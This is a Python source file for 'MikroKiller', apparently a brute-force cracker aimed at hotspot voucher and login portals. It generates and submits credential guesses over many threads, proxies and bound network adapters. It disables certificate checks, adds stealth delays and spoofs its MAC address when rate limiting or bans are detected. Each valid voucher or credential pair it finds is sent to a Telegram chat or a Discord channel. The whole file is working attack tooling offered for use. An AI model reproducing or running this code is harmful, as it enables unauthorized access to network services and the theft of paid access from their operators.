import time
import threading
import base64
import random
import requests
import concurrent.futures
import ctypes
from requests.adapters import HTTPAdapter
from urllib3.util .retry import Retry

from core.pattern_analyzer import PatternAnalyzer
from core.generator import VoucherGenerator
from config import SUCCESS_KEYWORDS, FAIL_KEYWORDS, BAN_KEYWORDS
from utils.network import change_mac, get_current_wifi_info, SourceAddressAdapter

class ProxyManager :

    def __init__(self, proxy_list =None):
        self.proxies =[p.strip()for p in (proxy_list or [])if p.strip()]
        self.index =0
    def get_next(self):
        if not self.proxies :
            return None
        p =self.proxies [self.index %len(self.proxies)]
        self.index +=1
        protocol ='socks5'if 'socks5'in p.lower()else 'http'
        return {'http':f'{protocol}://{p}', 'https':f'{protocol}://{p}'}

class VoucherCracker :

    def __init__(self, target_url, auth_mode ='both', session_name ='session',
    threads =5, user_field ='username', user_static_val ='',
    user_char_type ='digits', user_min_len =8, user_max_len =8,
    user_start ='', user_end ='', user_contains ='', user_letter_case ='lowercase',
    pass_field ='password', pass_static_val ='',
    pass_char_type ='digits', pass_min_len =8, pass_max_len =8,
    pass_start ='', pass_end ='', pass_contains ='', pass_letter_case ='lowercase',
    analytic_mode =False, manual_samples ='',
    user_use_luhn =False, pass_use_luhn =False,
    proxies =None, stealth =False, delay =0, auto_spoof =False,
    telegram_token ='', telegram_chat ='',
    discord_webhook ='', discord_token ='', discord_channel ='',
    stop_after =1, bound_adapter_ips =None, **kwargs):

        self.target_url =target_url
        self.auth_mode =auth_mode
        self.session_name =session_name
        self.threads =max(min(int(threads or 5), 20), 5)

        self.user_field =user_field
        self.user_static_val =user_static_val
        self.user_char_type =user_char_type
        self.user_min_len =int(user_min_len or 8)
        self.user_max_len =int(user_max_len or 8)
        self.user_start =user_start
        self.user_end =user_end
        self.user_contains =user_contains
        self.user_letter_case =user_letter_case
        self.user_use_luhn =user_use_luhn

        self.pass_field =pass_field
        self.pass_static_val =pass_static_val
        self.pass_char_type =pass_char_type
        self.pass_min_len =int(pass_min_len or 8)
        self.pass_max_len =int(pass_max_len or 8)
        self.pass_start =pass_start
        self.pass_end =pass_end
        self.pass_contains =pass_contains
        self.pass_letter_case =pass_letter_case
        self.pass_use_luhn =pass_use_luhn

        self.analytic_mode =analytic_mode
        self.proxy_mgr =ProxyManager(proxies)
        self.stealth =stealth
        self.delay =float(delay or 0)
        self.auto_spoof =auto_spoof
        self.tg_token =telegram_token
        self.tg_chat =telegram_chat
        self.discord_webhook =discord_webhook
        self.discord_token =discord_token
        self.discord_channel =discord_channel
        self.stop_after =int(stop_after or 1)
        self.bound_adapter_ips =bound_adapter_ips or []

        self.pattern_analyzer =None
        if self.analytic_mode :
            self.pattern_analyzer =PatternAnalyzer(manual_samples)
            self.pattern_analyzer .load_patterns()

        self.generator =VoucherGenerator(self.pattern_analyzer)

        self.running =False
        self.paused =False
        self.found_valid =False
        self.tried_pairs =set()
        self._spoofing_ips =set()
        self._waiting_reconnect =set()

        self.origin_wifi_info ={}

        self.invalid_file =f'{session_name}_invalid.txt'
        self.valid_file =f'{session_name}_valid.txt'

        self.lock =threading.Lock()
        self.total_tried =0
        self.valid_found =0
        self.errors =0
        self.start_time =None
        self.elapsed_time =0

        self.sessions =[]
        self.ip_to_alias ={}
        retries =Retry(total =2, backoff_factor =0.3, status_forcelist =[500, 502, 503, 504])

        is_localhost =('127.0.0.1'in self.target_url or 'localhost'in self.target_url)
        
        if self.bound_adapter_ips and not is_localhost :
            import subprocess
            for ip in self.bound_adapter_ips :
                session =requests.Session()
                bound =SourceAddressAdapter(ip, max_retries =retries)
                session.mount('http://', bound)
                session.mount('https://', bound)
                self.sessions .append((session, ip))

                try :
                    ps_alias =f'powershell -NoProfile -Command "(Get-NetIPAddress -IPAddress \'{ip}\').InterfaceAlias"'
                    alias =subprocess.check_output(ps_alias, shell =True, timeout =5).decode(errors ='ignore').strip()
                    if alias :
                        self.ip_to_alias [ip]=alias
                except :
                    pass
        
        if not self.sessions :
            session =requests.Session()
            adapter =HTTPAdapter(max_retries =retries)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            self.sessions .append((session, None))

        self.session_index =0

        self.headers ={'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'}

    def stop(self):

        self.running =False

    def resume_after_reconnect(self):

        self._waiting_reconnect .clear()
        self.paused =False
        self.log('[*] Resuming attack...')

    def get_stats(self):

        elapsed =(time.time()-self.start_time)if self.start_time else 0
        rps =round(self.total_tried /elapsed, 1)if elapsed >0 else 0
        return {'tried': self.total_tried,
        'valid': self.valid_found,
        'errors': self.errors,
        'elapsed': round(elapsed, 1),
        'rps': rps }

    def is_internet_connected(self):

        try :
            requests.head('https://www.google.com', timeout =3)
            return True
        except :
            try :
                requests.head('https://www.cloudflare.com', timeout =3)
                return True
            except :
                return False

    def send_telegram(self, msg, network_name ='Unknown'):

        if not self.tg_token or not self.tg_chat :
            return

        retry_count =0
        max_retries =10

        while retry_count <max_retries :
            if self.is_internet_connected():
                try :
                    url =f'https://api.telegram.org/bot{self.tg_token}/sendMessage'
                    message =f'🚀 MikroKiller Alert:\n📡 Network: {network_name}\n{msg}'
                    requests.post(url,
                    data ={'chat_id':self.tg_chat, 'text':message},
                    timeout =5)
                    return
                except :
                    pass

            retry_count +=1
            if retry_count <max_retries :
                self.log(f'[*] Waiting for internet... Telegram retry {retry_count}/{max_retries}')
                time.sleep(5)

        self.log('[!] Could not send Telegram notification - internet unavailable')

    def send_discord(self, msg, network_name ='Unknown'):

        if not (self.discord_webhook or (self.discord_token and self.discord_channel)):
            return

        retry_count =0
        max_retries =10

        while retry_count <max_retries :
            if self.is_internet_connected():
                try :
                    formatted_msg =f'🚀 **MikroKiller Alert:**\n📡 Network: {network_name}\n```{msg}```'

                    if self.discord_webhook :
                        requests.post(self.discord_webhook,
                        json ={'content':formatted_msg},
                        timeout =5)
                        return

                    elif self.discord_token and self.discord_channel :
                        url =f'https://discord.com/api/v10/channels/{self.discord_channel}/messages'
                        headers ={'Authorization': f'Bot {self.discord_token}',
                        'Content-Type': 'application/json'}
                        requests.post(url,
                        headers =headers,
                        json ={'content':formatted_msg},
                        timeout =5)
                        return
                except :
                    pass

            retry_count +=1
            if retry_count <max_retries :
                self.log(f'[*] Waiting for internet... Discord retry {retry_count}/{max_retries}')
                time.sleep(5)

        self.log('[!] Could not send Discord notification - internet unavailable')

    def save_valid_pair(self, user, password):

        if self.auth_mode =='username':
            content =user
        elif self.auth_mode =='password':
            content =password
        else :
            content =f'{user}:{password}'

        with self.lock :

            if content in self.saved_valid :
                return
            self.saved_valid .add(content)
            with open(self.valid_file, 'a')as f :
                f.write(content +'\n')
            self.valid_found +=1
            self.found_valid =True
            if self.pattern_analyzer :
                self.pattern_analyzer .add_sample(content)
            reached_target =(self.valid_found >=self.stop_after)

        network_name ='Unknown'
        adapter_ip =self.bound_adapter_ips [0]if self.bound_adapter_ips else None
        wifi_info =get_current_wifi_info(adapter_ip)

        network_name =wifi_info.get('ssid')if wifi_info else None
        if not network_name and adapter_ip and adapter_ip in self.origin_wifi_info :
            network_name =self.origin_wifi_info [adapter_ip].get('ssid')
        if not network_name :
            network_name ='Unknown'

        msg =f'Valid Found!\n{content}\n({self.valid_found}/{self.stop_after})'
        self.send_telegram(msg, network_name)
        self.send_discord(msg, network_name)

        try :
            import eel
            eel.on_valid_found(content)()
        except Exception :
            pass

        if reached_target :
            self.log(f'[+] Reached target: {self.valid_found}/{self.stop_after} valid hits.Stopping.')
            self.running =False

    def check_pair(self, user, password):

        if self.paused :

            while self.paused and self.running :
                time.sleep(0.05)

        if self.stealth :
            time.sleep(random.uniform(0.1, 0.4))

        if self.delay :
            time.sleep(self.delay)

        payload ={}
        if self.auth_mode =='username':
            payload [self.user_field]=user
        elif self.auth_mode =='password':
            payload [self.pass_field]=password
        else :
            payload [self.user_field]=user
            payload [self.pass_field]=password

        headers =self.headers .copy()
        if self.auth_mode =='both':
            auth_str =base64.b64encode(f'{user}:{password}'.encode()).decode()
            headers ['Authorization']=f'Basic {auth_str}'

        proxy =self.proxy_mgr .get_next()

        max_ban_retries =3
        for _attempt in range(max_ban_retries):
            if not self.running :
                return None

            try :

                while True :
                    if not self.running :
                        return None
                    with self.lock :
                        active_sessions =[s for s in self.sessions if s [1]not in self._spoofing_ips]
                        if active_sessions :
                            session, adapter_ip =active_sessions [self.session_index %len(active_sessions)]
                            self.session_index +=1
                            break
                    time.sleep(0.2)

                response =session.post(self.target_url,
                data =payload,
                headers =headers,
                timeout =8,
                allow_redirects =False,
                verify =False,
                proxies =proxy)

                content =response.text .lower()

                if response.status_code in [403, 429]or any(x in content for x in BAN_KEYWORDS):
                    if self.auto_spoof and adapter_ip not in self._spoofing_ips :
                        self.log(f'[!] BAN DETECTED on {adapter_ip or "default"}! Initiating Evasion Protocol...')
                        self.trigger_auto_spoof(adapter_ip)

                    continue

                if any(x in content for x in FAIL_KEYWORDS):
                    return False

                if 'type="password"'in content and '<input'in content :
                    return False

                if response.status_code ==302 :
                    loc =response.headers .get('Location', '').lower()
                    if 'login'not in loc and 'error'not in loc :
                        label =user if self.auth_mode =='username'else f'{user}:{password}'
                        self.log(f'[+] FOUND: {label}')
                        self.save_valid_pair(user, password)
                        return True

                if response.status_code ==200 :
                    if any(x in content for x in SUCCESS_KEYWORDS):
                        label =user if self.auth_mode =='username'else f'{user}:{password}'
                        self.log(f'[+] FOUND: {label}')
                        self.save_valid_pair(user, password)
                        return True

                return False

            except Exception :
                return None

        return None

    def trigger_auto_spoof(self, adapter_ip):

        with self.lock :
            if adapter_ip in self._spoofing_ips :
                return
            self._spoofing_ips .add(adapter_ip)

        threading.Thread(target =self._auto_spoof_worker, args =(adapter_ip,), daemon =True).start()

    def _auto_spoof_worker(self, adapter_ip):

        try :
            if ctypes.windll .shell32.IsUserAnAdmin()==0 :
                self.log('[!] Evasion Failed: Admin rights required.')
                with self.lock :
                    self._spoofing_ips .discard(adapter_ip)
                return

            success, new_mac =change_mac(adapter_ip)
            if not success :
                self.log(f'[!] Evasion Failed on {adapter_ip}: {new_mac}')
                with self.lock :
                    self._spoofing_ips .discard(adapter_ip)
                return

            self.log(f'[+] MAC changed for {adapter_ip} → {new_mac}.')

            origin_info =self.origin_wifi_info .get(adapter_ip)

            if not origin_info or not origin_info.get('ssid'):
                with self.lock :
                    self._spoofing_ips .discard(adapter_ip)
                return
            reconnected_info =None
            alias =self.ip_to_alias .get(adapter_ip)

            ignore_ssids ={'identifying...', 'identifying', 'unidentified network', ''}
            for _ in range(60):
                time.sleep(1)
                info =get_current_wifi_info(adapter_ip =None, adapter_alias =alias)
                if info and info.get('ssid'):
                    ssid =info ['ssid'].strip()

                    if ssid.lower()in ignore_ssids :
                        continue
                    reconnected_info =info
                    break

            if not reconnected_info :

                info =get_current_wifi_info(adapter_ip =None, adapter_alias =alias)
                if info and info.get('ssid')and info ['ssid'].strip().lower()not in ignore_ssids :
                    reconnected_info =info

            if not reconnected_info :
                self._notify_wrong_network(new_mac, None, adapter_ip)
                return

            if reconnected_info ['ssid']==origin_info ['ssid']:
                with self.lock :
                    self._spoofing_ips .discard(adapter_ip)
            else :
                self._notify_wrong_network(new_mac, reconnected_info ['ssid'], adapter_ip)

        except Exception as e :
            self.log(f'[!] Evasion error on {adapter_ip}: {e}')
            with self.lock :
                self._spoofing_ips .discard(adapter_ip)

    def _notify_wrong_network(self, new_mac, connected_ssid, adapter_ip):

        self._waiting_reconnect .add(adapter_ip)
        self.paused =True

        msg_ssid =connected_ssid if connected_ssid else '(not connected)'
        expected_ssid =self.origin_wifi_info .get(adapter_ip, {}).get('ssid', 'Unknown')

        if callable(getattr(self, 'on_wrong_network', None)):
            self.on_wrong_network(expected_ssid, msg_ssid, new_mac)

    def start(self):

        self.running =True
        self.paused =False
        self.total_tried =0
        self.errors =0
        self.start_time =time.time()
        self.tried_pairs =set()
        self.saved_valid =set()

        import os, shutil

        if os.path.exists(self.invalid_file) and os.path.getsize(self.invalid_file) > 0:
            with open(self.invalid_file) as f:
                for line in f:
                    key = line.strip()
                    if key:
                        self.tried_pairs.add(key)

        for f in (self.valid_file, self.invalid_file):
            if os.path.exists(f) and os.path.getsize(f) > 0:
                backup = f.replace('.txt', '_backup.txt')
                shutil.copy2(f, backup)

        open(self.valid_file, 'w').close()
        open(self.invalid_file, 'w').close()

        self.log(f'[-] Engine active — {self.target_url}')

        is_localhost =('127.0.0.1'in self.target_url or 'localhost'in self.target_url)
        
        if self.bound_adapter_ips and not is_localhost :
            self.log(f'[-] Bound to {len(self.bound_adapter_ips)} adapter(s)')
            for ip in self.bound_adapter_ips :
                alias =self.ip_to_alias .get(ip)
                wifi =get_current_wifi_info(adapter_ip =None, adapter_alias =alias)
                if wifi and wifi.get('ssid'):
                    self.origin_wifi_info [ip]=wifi
        elif is_localhost :
            self.log('[-] Localhost target')
        else :
            wifi =get_current_wifi_info()
            if wifi and wifi.get('ssid'):
                self.origin_wifi_info [None]=wifi

        try :
            self.sessions [0][0].get(self.target_url, timeout =5, verify =False)
            self.log('[*] Target reachable.Starting...')
        except requests.exceptions.ConnectionError as e:
            self.log(f'[!] Warning: Target network unreachable — Connection failed: {str(e)[:100]}')
        except requests.exceptions.Timeout:
            self.log('[!] Warning: Target request timed out (5s).May be slow or unreachable.')
        except Exception as e:
            self.log(f'[!] Warning: Target unreachable — {type(e).__name__}: {str(e)[:100]}')

        try :
            num_adapters =0
            if self.bound_adapter_ips and not is_localhost :
                num_adapters =len(self.bound_adapter_ips)
            if num_adapters ==0 :
                num_adapters =1
            executor =None
            current_total_workers =0

            with open(self.invalid_file, 'a')as f_inv :
                while self.running :
                    self.elapsed_time =time.time()-self.start_time

                    if self.paused :
                        time.sleep(0.1)
                        continue

                    needed_total_workers =self.threads *num_adapters
                    if executor is None or needed_total_workers !=current_total_workers :
                        current_total_workers =needed_total_workers
                        executor =concurrent.futures .ThreadPoolExecutor(max_workers =current_total_workers)

                    if len(self.tried_pairs)>1_000_000 :
                        self.tried_pairs .clear()

                    batch =[]
                    failed_gen =0

                    while len(batch)<current_total_workers :

                        u =self.user_static_val or self._gen_user()
                        p =self.pass_static_val or self._gen_pass()

                        if self.auth_mode =='username':
                            key =u
                        elif self.auth_mode =='password':
                            key =p
                        else :
                            key =f'{u}:{p}'

                        if key in self.tried_pairs :
                            failed_gen +=1
                            if failed_gen >5000 :
                                self.log('[!] Exhausted all unique combinations.')
                                self.running =False
                                break
                            continue

                        self.tried_pairs .add(key)
                        batch.append((u, p))
                        failed_gen =0

                    if not batch :
                        break

                    label_fn ={'username': lambda u, p: u,
                    'password': lambda u, p: p }.get(self.auth_mode, lambda u, p :f'{u}:{p}')

                    futs ={executor.submit(self.check_pair, u, p):label_fn(u, p)
                    for u, p in batch}

                    for f in concurrent.futures .as_completed(futs):
                        result =f.result()
                        label =futs [f]

                        if result is None :
                            with self.lock :
                                self.errors +=1

                                if label in self.tried_pairs :
                                    self.tried_pairs .discard(label)
                            continue

                        with self.lock :
                            self.total_tried +=1

                        if result is False :
                            f_inv.write(label +'\n')

                    f_inv.flush()

        except Exception as e :
            self.log(f'[!] Critical Error: {e}')

        self.running =False
        self.log(f'[-] Done.Total attempts: {self.total_tried}')

    def _gen_user(self):
        return self.generator .generate(self.user_char_type, self.user_min_len, self.user_max_len,
        self.user_start, self.user_end, self.user_contains,
        self.user_use_luhn, is_password =False, letter_case =self.user_letter_case)if self.auth_mode in ('username', 'both')else ''

    def _gen_pass(self):
        return self.generator .generate(self.pass_char_type, self.pass_min_len, self.pass_max_len,
        self.pass_start, self.pass_end, self.pass_contains,
        self.pass_use_luhn, is_password =True, letter_case =self.pass_letter_case)if self.auth_mode in ('password', 'both')else ''
